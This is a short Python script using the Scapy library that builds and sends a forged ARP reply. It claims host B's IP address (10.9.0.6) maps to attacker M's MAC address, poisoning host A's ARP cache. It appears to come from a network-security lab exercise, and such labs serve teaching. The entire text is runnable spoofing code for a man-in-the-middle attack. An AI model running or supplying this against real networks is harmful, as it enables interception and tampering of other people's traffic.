from scapy.all import *

# Set up Ethernet frame
E = Ether()  
E.dst = "ff:ff:ff:ff:ff:ff" # Broadcast to all devices 

# Set up ARP packet as a reply
A = ARP()
A.op = 2  # ARP reply
A.psrc = "10.9.0.6"  # B’s IP address
A.pdst = "10.9.0.5"  # A’s IP address
A.hwsrc = "02:42:0a:09:00:69"  # M’s MAC address (attacker’s MAC)
A.hwdst = "ff:ff:ff:ff:ff:ff"  # Broadcast MAC

# Construct and send the packet
pkt = E/A
sendp(pkt)
